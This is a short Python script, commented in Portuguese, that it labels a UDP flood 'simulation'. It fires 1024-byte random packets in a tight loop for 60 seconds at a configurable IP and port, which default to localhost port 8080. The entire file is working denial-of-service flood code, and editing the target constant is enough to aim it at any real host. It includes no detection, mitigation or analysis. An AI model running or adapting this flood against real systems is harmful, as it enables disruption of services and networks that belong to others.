import socket
import random
import time

# --- Configurações ---
ALVO_IP = "127.0.0.1"  # localhost
ALVO_PORTA = 8080        # Uma porta aleatória (não importa se está aberta ou não)
DURACAO_ATAQUE_SEGUNDOS = 60 # Duração da simulação
# ---------------------

print(f"Iniciando simulação de UDP Flood em {ALVO_IP}:{ALVO_PORTA} por {DURACAO_ATAQUE_SEGUNDOS} segundos.")
print("Pressione Ctrl+C para parar mais cedo.")

# Cria o socket UDP
cliente = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Gera bytes aleatórios para enviar como "carga"
bytes_aleatorios = random.randbytes(1024)

timeout_start = time.time()
pacotes_enviados = 0

try:
    while time.time() < timeout_start + DURACAO_ATAQUE_SEGUNDOS:
        # Envia o pacote UDP
        cliente.sendto(bytes_aleatorios, (ALVO_IP, ALVO_PORTA))
        pacotes_enviados += 1

except KeyboardInterrupt:
    print("\nSimulação interrompida pelo usuário.")
except Exception as e:
    print(f"Erro durante a simulação: {e}")
finally:
    print(f"Simulação concluída. Total de pacotes enviados: {pacotes_enviados}")
    cliente.close()